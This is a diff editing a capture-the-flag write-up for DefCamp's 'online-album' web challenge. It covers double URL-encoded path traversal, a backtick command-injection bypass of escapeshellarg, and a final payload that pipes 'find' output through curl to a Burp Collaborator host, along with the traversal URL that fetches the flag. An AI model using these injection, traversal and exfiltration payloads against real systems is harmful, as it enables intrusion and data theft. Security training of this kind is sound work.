@@ -230,7 +230,7 @@ NS5qcGVn.5d73d278c7468
 -->
 ```
 
-decoded MS5qcGVn to 1.jpeg then figured it out it would show there the output of any directory. Then I tried a path transerval attack with %2e%2e and I got output
+decoded `MS5qcGVn` to `1.jpeg` then figured it out it would show there the output of any directory. Then I tried a path transerval attack with `%2e%2e` and I got output
 
 ```
 <!-- Debug:
@@ -278,9 +278,9 @@ vendor
 webpack.mix.js
 ```
 
-Then I tried the /download/ path with `../composer.json` double url encoded. It worked and I got output.
+Then I tried the `/download/` path with `../composer.json` double url encoded. It worked and I got output.
 
-I then looked at routes, then ../app/Http/Controllers/HomeController.php and saw the `shell_exec` program
+I then looked at `../routes/web.php`, then `../app/Http/Controllers/HomeController.php` and saw the `shell_exec` program for the `POST /auto-logout` route.
 
 ```php
 $cmd = 'rm "'.storage_path().'/framework/sessions/'.escapeshellarg($request->logut_token).'"';
@@ -288,9 +288,31 @@ $cmd = 'rm "'.storage_path().'/framework/sessions/'.escapeshellarg($request->log
 
 `escapeshellarg` only escapes single quotes and wraps single quotes around. So using back tick I was able to run bash.
 
-I exfiltrated with curl to my burp collaborator. And I used `sleep 100` so that the php will timeout before the logout kicks in, so I can reuse the request without loging in again.
+When attempting to exploit this route, be sure to have the right cookies, and the right `_token`. You can get those from the bottom of any page after logging in
 
-used `find .`, exfiltrated to burp, noticed `../.flag/.asdpifsudyg8husijdaisonfudbigfhsdijispacdnvsubfhd`, used the following payload to get flag
+```js
+$.ajax({
+    type: "POST",
+    url: "http://online-album.dctfq19.def.camp/auto-logout",
+    success: function(result) {
+        window.location.replace("http://online-album.dctfq19.def.camp");
+    },
+    data: {
+        "_token": "ErOQFom5NVIh8WurlJ9sEoL5PnQvJdePLQ9jO5Z1",
+        "logut_token": "ZgNCelt4eHRVgC3UZSjMHE7rcgZSkNmxCtVGU80m",
+    }
+});
+```
+
+I exfiltrated with curl to my burp collaborator. And I used `sleep 200` so that the php will timeout before the logout kicks in, so I can reuse the request without loging in again.
+
+My final payload posted was. Be sure to have valid logged in cookies and valid csrf token when attempting this.
+
+```
+_token=VALID_TOKEN_HERE&logut_token=`find+/var/www/html+|+curl+ddumi7lzrmvbb2eelyq2btme45aoyk.burpcollaborator.net+--data+@-+|+sleep+200`
+```
+
+You can see I used `find /var/www/html`, exfiltrated the content to burp, noticed `../.flag/.asdpifsudyg8husijdaisonfudbigfhsdijispacdnvsubfhd`, used the following payload to get flag. You can use `https://requestbin.com/` instead of burp collab.
 
 ```
 https://online-album.dctfq19.def.camp/download/%252e%252e%252f%252e%2566%256c%2561%2567%252f%252e%2561%2573%2564%2570%2569%2566%2573%2575%2564%2579%2567%2538%2568%2575%2573%2569%256a%2564%2561%2569%2573%256f%256e%2566%2575%2564%2562%2569%2567%2566%2568%2573%2564%2569%256a%2569%2573%2570%2561%2563%2564%256e%2576%2573%2575%2562%2566%2568%2564
